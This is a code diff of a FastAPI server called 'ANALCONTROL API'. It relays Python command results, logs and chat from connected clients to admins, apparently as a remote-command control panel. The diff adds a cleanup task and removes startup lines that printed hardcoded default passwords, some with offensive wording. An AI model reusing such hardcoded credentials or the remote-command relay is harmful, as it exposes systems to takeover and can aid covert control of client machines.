+            try:
+                supabase.table("commands")\
+                    .update({
+                        "status": "completed",
+                        "result": data.get("result"),
+                        "error": data.get("error", ""),
+                        "completed_at": datetime.utcnow().isoformat()
+                    })\
+                    .eq("id", command_id)\
+                    .execute()
+            except Exception as e:
+                logger.error(f"Supabase Python result update error: {e}")
+        
+        await manager.notify_admins({
+            "type": "python_result",
+            "client_id": client_id,
+            "command_id": command_id,
+            "filename": data.get("filename"),
+            "result": data.get("result"),
+            "error": data.get("error"),
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+    elif message_type == "log":
+        log_entry = {
+            "id": str(uuid.uuid4()),
+            "client_id": client_id,
+            "log_type": data.get("log_type", "info"),
+            "message": data.get("message", ""),
+            "created_at": datetime.utcnow().isoformat()
+        }
+        
+        db.logs.append(log_entry)
+        
+        if supabase:
+            try:
+                supabase.table("logs").insert({
+                    "client_id": client_id,
+                    "log_type": data.get("log_type", "info"),
+                    "message": data.get("message", ""),
+                    "created_at": datetime.utcnow().isoformat()
+                }).execute()
+            except Exception as e:
+                logger.error(f"Supabase log storage error: {e}")
+        
+        await manager.notify_admins({
+            "type": "client_log",
+            "client_id": client_id,
+            "log_type": data.get("log_type", "info"),
+            "message": data.get("message", ""),
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+    elif message_type == "chat_message":
+        message = data.get("message", "")
+        if message:
+            chat_msg = {
+                "id": str(uuid.uuid4()),
+                "sender": client_id,
+                "message": f"[Client {client_id}]: {message}",
+                "timestamp": datetime.utcnow().isoformat(),
+                "recipient": "all",
+                "sender_tag": {"role": "client", "color": "#32cd32"}
+            }
+            
+            db.chat_messages.append(chat_msg)
+            
+            await manager.notify_admins({
+                "type": "client_chat",
+                "client_id": client_id,
+                "message": message,
+                "timestamp": datetime.utcnow().isoformat()
+            })
 
 @app.websocket("/ws/chat/{user_id}")
 async def websocket_chat(websocket: WebSocket, user_id: str):
@@ -2098,7 +2126,6 @@ async def websocket_chat(websocket: WebSocket, user_id: str):
                     })
                     
                 elif data_type == "typing":
-                    # Broadcast typing indicator
                     await manager.broadcast_chat({
                         "type": "user_typing",
                         "user_id": user_id,
@@ -2107,14 +2134,12 @@ async def websocket_chat(websocket: WebSocket, user_id: str):
                     }, exclude_user=user_id)
                     
                 elif data_type == "read_receipt":
-                    # Handle read receipts
                     message_id = data.get("message_id")
                     if message_id:
                         for msg in db.chat_messages:
                             if msg["id"] == message_id and user_id not in msg.get("read_by", []):
                                 msg.setdefault("read_by", []).append(user_id)
                                 
-                                # Broadcast read receipt
                                 await manager.broadcast_chat({
                                     "type": "message_read",
                                     "message_id": message_id,
@@ -2168,12 +2193,10 @@ async def general_exception_handler(request: Request, exc: Exception):
 async def serve_frontend():
     """Serve the frontend HTML"""
     try:
-        # Try to read the frontend HTML file
         with open("frontend.html", "r", encoding="utf-8") as f:
             html_content = f.read()
         return HTMLResponse(content=html_content)
     except:
-        # Return a simple message if frontend file not found
         return JSONResponse({
             "message": "ANALCONTROL API is running",
             "version": "3.0",
@@ -2184,9 +2207,29 @@ async def serve_frontend():
                 "ws_admin": "/ws/admin",
                 "ws_client": "/ws/client/{client_id}",
                 "ws_chat": "/ws/chat/{user_id}"
-            },
-            "note": "Place frontend.html in the same directory to serve the web interface"
+            }
         })
+
+# ========== BACKGROUND TASKS ==========
+async def cleanup_tasks():
+    """Background task to clean up old connections and data"""
+    while True:
+        try:
+            # Check connection timeouts
+            manager.check_connection_timeouts()
+            
+            # Clean up old logs (keep last 1000)
+            if len(db.logs) > 1000:
+                db.logs = db.logs[-1000:]
+            
+            # Clean up old commands (keep last 500)
+            if len(db.commands) > 500:
+                db.commands = db.commands[-500:]
+            
+        except Exception as e:
+            logger.error(f"Cleanup task error: {e}")
+        
+        await asyncio.sleep(60)  # Run every minute
 
 # ========== APPLICATION STARTUP ==========
 @app.on_event("startup")
@@ -2202,13 +2245,10 @@ async def startup_event():
     logger.info("   • Client: /ws/client/{client_id}")
     logger.info("   • Chat: /ws/chat/{user_id}")
     logger.info("📚 Documentation: /docs")
-    logger.info("👤 Default users:")
-    logger.info("   • xotiic/40671Mps19* (Owner) - Red tag")
-    logger.info("   • admin/admin123 (Admin)")
-    logger.info("   • nathan/femboy67 (Admin with femboy theme) - Purple tag")
-    logger.info("   • kizer/kidraper67 (Sr Admin) - Orange tag")
-    logger.info("💬 Chat system with file sharing enabled")
-    logger.info("=" * 60)
+    
+    # Start background tasks
+    asyncio.create_task(cleanup_tasks())
+    
     logger.info("✅ Application startup complete")
 
 if __name__ == "__main__":
